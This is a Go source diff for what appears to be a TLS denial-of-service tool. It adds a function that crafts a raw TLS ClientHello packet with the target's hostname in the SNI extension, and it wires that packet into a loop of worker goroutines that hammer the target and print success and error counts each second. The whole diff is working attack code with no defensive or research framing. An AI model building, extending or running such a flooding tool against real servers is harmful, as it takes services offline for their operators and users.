@@ -8,6 +8,7 @@ import (
 	"log"
 	"net"
 	"os"
+	"strings"
 	"sync/atomic"
 	"time"
 )
@@ -96,6 +97,35 @@ func runTLSDoSInstance(addr *net.TCPAddr) {
 	}
 }
 
+var clientHello []byte
+
+func generatePacket(serverName string) {
+
+	realName := strings.Split(serverName, ":")[0]
+	realName = strings.Split(realName, "/")[0]
+	ip := net.ParseIP(realName)
+	if ip != nil {
+		clientHello = clientHelloPrototype[:len(clientHelloPrototype)-9]
+		return
+	}
+
+	name := []byte(realName)
+	clientHello = make([]byte, len(clientHelloPrototype)+len(name))
+	copy(clientHello, clientHelloPrototype)
+	binary.BigEndian.PutUint16(clientHello[3:], uint16(len(clientHello)-5))   //Record Length
+	binary.BigEndian.PutUint16(clientHello[7:], uint16(len(clientHello)-9))   //Handshake Length
+	binary.BigEndian.PutUint16(clientHello[50:], uint16(len(clientHello)-52)) //Extension Length
+
+	//SNI Extension lengths
+	binary.BigEndian.PutUint16(clientHello[len(clientHelloPrototype)-7:],
+		uint16(len(name)+5))
+	binary.BigEndian.PutUint16(clientHello[len(clientHelloPrototype)-5:],
+		uint16(len(name)+3))
+	binary.BigEndian.PutUint16(clientHello[len(clientHelloPrototype)-2:],
+		uint16(len(name)))
+	copy(clientHello[len(clientHelloPrototype):], name)
+}
+
 func main() {
 	flag.Parse()
 	if flag.Arg(0) == "" {
@@ -113,6 +143,7 @@ func main() {
 	if options.verbose {
 		fmt.Println("Resolved!")
 	}
+	generatePacket(flag.Arg(0))
 	for i := 0; i < options.workers; i++ {
 		go func() {
 			for {
@@ -123,8 +154,8 @@ func main() {
 	tckr := time.NewTicker(1 * time.Second)
 	for {
 		select {
-			case <- tckr.C:
-				fmt.Printf("Successes: %d | Errors: %d\n", atomic.SwapUint64(&successes, 0), atomic.SwapUint64(&errors, 0))
+		case <-tckr.C:
+			fmt.Printf("Successes: %d | Errors: %d\n", atomic.SwapUint64(&successes, 0), atomic.SwapUint64(&errors, 0))
 		}
 	}
 }
